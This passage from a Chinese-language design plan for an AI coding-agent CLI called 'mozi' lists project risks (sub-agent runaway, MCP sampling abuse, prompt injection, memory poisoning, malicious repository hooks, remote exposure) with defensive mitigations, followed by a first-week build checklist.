| R7 | 开源冷启动无关注 | 高 | 中 | 评测跑分表（稀缺内容）+ embed-minimal 示例 + 每周 changelog 运营节奏 |
| R8 | API 费用（开发与评测） | 中 | 低 | 日常开发用 ScriptedProvider（零成本）；评测用 DeepSeek 等低成本模型为主力 |
| R9 | 子智能体失控（递归派发/并发风暴/权限穿透） | 中 | 高 | 硬上限三重控制：maxDepth=2 + maxConcurrent=3 + maxPerTurn=8；权限单调收紧不变式进 CI 强测；父 abort 级联取消防孤儿（见详细设计 M12） |
| R10 | MCP Sampling 滥用（server 借用 LLM 烧 token / 提示注入） | 中 | 高 | 默认 deny + 三档管控（deny/ask/allow）+ 单次 maxTokens 上限 + 模型限定在已配置 provider 内；server 内容永不进 system prompt；子智能体中强制 deny；全部交互进审计日志（见详细设计 M8） |
| R11 | 远程 MCP server 不稳定（断线/限流/旧版协议） | 高 | 中 | 指数退避重连（5 次）+ 熔断 30s + 状态事件上报；旧 HTTP+SSE 被动降级兼容；协议违规断开不重试（安全优先） |
| R12 | 定时任务无人值守失控（改坏文件/烧 token/静默失败） | 中 | 高 | 四重防护：ask→deny 静态化 + allowlist 白名单；worktree 产物隔离（默认不直改工作区，direct 需显式声明且与交互会话互斥）；单次成本上限 + 超时强停；连续失败≥3 自动停用 + 通知。全部运行可审计可回放（见详细设计 M13） |
| R13 | OS 调度注册不可靠（crontab 权限/schtasks 变更/路径漂移） | 中 | 中 | mozi task doctor 自检（注册在位/手动 tick 验证/路径有效）；daemon 双通道兼容；任务清单与 OS 注册解耦（tick 模式：注册仅一条且可重建） |
| R14 | 远程暴露面被攻击（节点暴露公网/中继被攻破/手机丢失） | 中 | 高 | 默认关闭远程；LAN 自签 pinning；中继 E2E（无密钥不可读）+ 信封节点签名防伪造；6 位配对码 5min TTL + 节点屏幕确认；设备秒级吊销 + 手机生物识别 + SQLCipher；high 风险审批手机端默认受限；推送零内容（见详细设计 M14 §14.10 威胁模型） |
| R15 | 推送基础设施依赖第三方（FCM/APNs 凭据/运营成本） | 中 | 中 | PushGateway 可插拔（默认无推送；自托管 ntfy/UnifiedPush 完整可用）；零内容推送使平台凭据无法接触业务数据；云中继非开源项目必选项，自托管全功能 |
| R16 | Prompt 变更引发行为回归（改一句话效果雪崩） | 高 | 高 | promptHash 全会话可追溯；变更 PR 强制 benchmark 门禁（降幅 >5% 阻断）；A/B 分桶灰度；对抗样例防 AGENTS.md 越权注入（见详细设计 M15） |
| R17 | 记忆污染（错误事实累积/敏感信息入库/被诱导写入） | 中 | 中 | 确认制默认 + 信任分级标注注入；SecretMasker 拒写密钥；去重与矛盾覆盖；全部写入可审计可撤销；mozi memory export 脱敏（见详细设计 M16） |
| R18 | 项目级 Hooks 投毒（恶意仓库借 hook 执行命令） | 中 | 高 | 项目级默认禁用 + 逐个审查启用 + 文件指纹变更重确认；CI/headless 一律忽略；hook 执行全审计（见详细设计 M18 §18.5） |

---

## 附：首周启动清单（Day 1-7）

1. `pnpm` workspace 初始化，建 `shared/core/providers/tools` 五个空包 + 依赖方向 CI；
2. `shared` 落地 `AgentEvent` / `ChatMessage` / `ToolCall` / `ToolResult` 全部 DTO（全项目契约，一次定稿）；
3. `providers`：OpenAI 兼容 Provider + 流式聚合 + `ScriptedProvider`（测试基建先行）；
4. `core`：AgentEngine 主循环 v0（无审批、无压缩），events 直落 JSONL；
5. `tools`：read_file / write_file / glob 三个工具 + 注册表；
6. `apps/cli`：commander 入口 + 最素 REPL（Node readline 即可，Ink 后置）；
7. 验收：`mozi "读取本目录 README 并统计字数"` 全链路跑通——事件可看、JSONL 可回放。

> 这份清单的意义：第 7 天结束时，项目的心脏（loop + 事件 + 工具 + 持久化）已经跳动了，剩下的一切都是在它上面长肉。

---

*文档结束。术语表与更细的接口签名可在进入 M0 后于 `docs/rfcs/0001-engine-contract.md` 中继续深化。*




> AI生成